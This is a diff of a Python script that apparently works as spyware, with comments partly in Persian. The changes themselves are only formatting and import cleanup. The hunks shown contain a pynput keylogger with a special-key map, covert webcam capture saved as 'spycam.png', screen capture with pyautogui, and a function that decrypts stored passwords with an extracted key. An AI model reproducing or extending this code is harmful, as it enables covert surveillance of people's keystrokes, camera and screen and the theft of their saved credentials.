@@ -3,8 +3,7 @@
 from pynput.keyboard import Listener, Key
 from datetime import datetime, timedelta
 
-special_keys = {"Key.space": "[Space]", "Key.enter": "[Enter]", "<98>": "2", "Key.tab": "[Tab]",
-                "Key.ctrl_l": "[LCtrl]"}
+special_keys = {"Key.space": "[Space]", "Key.enter": "[Enter]", "<98>": "2", "Key.tab": "[Tab]","Key.ctrl_l": "[LCtrl]"}
 
 
 def on_press(key):
@@ -33,7 +32,7 @@ import cv2
 camera = cv2.VideoCapture(0)
 ret, frame = camera.read()
 if ret:
-     cv2.imwrite("spycam.png", frame)
+    cv2.imwrite("spycam.png", frame)
 
 camera.release()
 cv2.destroyAllWindows()
@@ -41,7 +40,6 @@ cv2.destroyAllWindows()
 # ----------------------اسکرین شات---------------------
 # pip install pyautogui
 import pyautogui
-from time import sleep
 my_screenshot = pyautogui.screenshot()
 my_screenshot.save("screenshot.png")
 
@@ -65,7 +63,6 @@ def pass_decryption(password, encryption_key):
         return cipher.decrypt(password)[:-16].decode()
     except:
         return  "No Passwords"
-
 
 
 # به دست آوردن کلید
